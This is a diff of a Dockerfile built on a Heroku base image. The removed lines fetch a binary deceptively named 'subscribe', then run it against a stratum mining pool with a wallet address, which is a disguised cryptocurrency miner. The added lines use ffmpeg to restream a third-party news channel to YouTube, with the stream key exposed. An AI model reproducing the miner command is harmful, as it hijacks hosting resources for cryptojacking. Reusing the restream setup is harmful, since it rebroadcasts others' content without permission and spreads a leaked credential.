@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
-RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MgwuCc6yvsvMeg6AosthAe4gTvQwaoKFFu.VPS
+RUN apt-get install ffmpeg
+RUN ffmpeg -re -i https://b1news.beritasatumedia.com/Beritasatu/B1News_manifest.m3u8 -c:v copy -c:a aac -ar 44100 -ab 128k -ac 2 -strict -2 -flags +global_header -bsf:a aac_adtstoasc -bufsize 2000k -f flv "rtmp://a.rtmp.youtube.com/live2/uz4g-t2ue-harg-pw1a-3439"
 CMD bash heroku.sh
